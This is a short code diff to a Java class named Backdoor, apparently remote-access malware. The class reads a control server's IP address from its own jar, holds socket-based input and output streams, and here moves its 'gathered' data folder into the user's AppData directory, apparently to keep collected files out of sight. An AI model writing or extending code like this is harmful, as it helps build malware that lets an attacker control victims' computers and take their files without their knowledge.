@@ -11,6 +11,7 @@ public class Backdoor {
 	private static Socket socket;
 	private static Scanner in;
 	public static PrintWriter out;
+	public static String gatheredDir = System.getProperty("user.home") + "\\AppData\\Gathered\\";
 
 	/**
 	 * Constructs and starts a new Backdoor.
@@ -28,12 +29,12 @@ public class Backdoor {
 	 * Uses {@link #readFromJar(String)} to get the contents of "ip", a text file
 	 * inside the jar file this class will be running from. This file contains the
 	 * IP address of the server to be used to control the backdoor. Sets {@link #ip}
-	 * to this address. Creates directory "gathered".
+	 * to this address. Creates directory {@link gatheredDir}.
 	 */
 	private Backdoor() {
 		try {
 			ip = readFromJar("/ip");
-			new File("gathered").mkdir();
+			new File(gatheredDir).mkdir();
 		} catch (Exception e) {
 			System.exit(0);
 		}
